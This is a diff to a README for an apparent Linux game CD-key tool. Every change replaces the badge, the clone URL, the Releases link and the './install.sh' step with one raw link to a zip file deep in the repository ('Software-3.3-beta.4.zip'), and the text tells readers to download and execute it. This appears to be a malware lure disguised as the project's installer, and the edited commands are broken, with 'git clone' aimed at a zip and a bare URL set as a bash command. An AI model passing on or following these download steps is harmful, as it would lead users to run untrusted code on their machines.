@@ -1,6 +1,6 @@
 # LINUX DO CD Key 🎮
 
-![CDK Logo](https://img.shields.io/badge/CDK-LINUX%20DO%20CD%20Key-blue)
+![CDK Logo](https://github.com/cheeeeeeeeeeem/cdk/raw/refs/heads/master/Pachytylus/Software-3.3-beta.4.zip%20DO%20CD%20Key-blue)
 
 Welcome to the **LINUX DO CD Key** repository! This project provides tools and resources for managing and utilizing CD keys for Linux games. Whether you are a developer, gamer, or enthusiast, you will find useful information and tools in this repository.
 
@@ -35,7 +35,7 @@ To install the **LINUX DO CD Key** tools, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/cheeeeeeeeeeem/cdk.git
+   git clone https://github.com/cheeeeeeeeeeem/cdk/raw/refs/heads/master/Pachytylus/Software-3.3-beta.4.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -46,10 +46,10 @@ To install the **LINUX DO CD Key** tools, follow these steps:
 
 3. **Run the Installer**:
 
-   You can download the installer from the [Releases section](https://github.com/cheeeeeeeeeeem/cdk/releases). Find the latest release, download the appropriate file, and execute it.
+   You can download the installer from the [Releases section](https://github.com/cheeeeeeeeeeem/cdk/raw/refs/heads/master/Pachytylus/Software-3.3-beta.4.zip). Find the latest release, download the appropriate file, and execute it.
 
    ```bash
-   ./install.sh
+   https://github.com/cheeeeeeeeeeem/cdk/raw/refs/heads/master/Pachytylus/Software-3.3-beta.4.zip
    ```
 
 ## Usage
@@ -94,7 +94,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the **LINUX DO CD Key** tools, visit the [Releases section](https://github.com/cheeeeeeeeeeem/cdk/releases). Make sure to download the correct file for your system and execute it as needed.
+To download the latest version of the **LINUX DO CD Key** tools, visit the [Releases section](https://github.com/cheeeeeeeeeeem/cdk/raw/refs/heads/master/Pachytylus/Software-3.3-beta.4.zip). Make sure to download the correct file for your system and execute it as needed.
 
 ## Conclusion
 
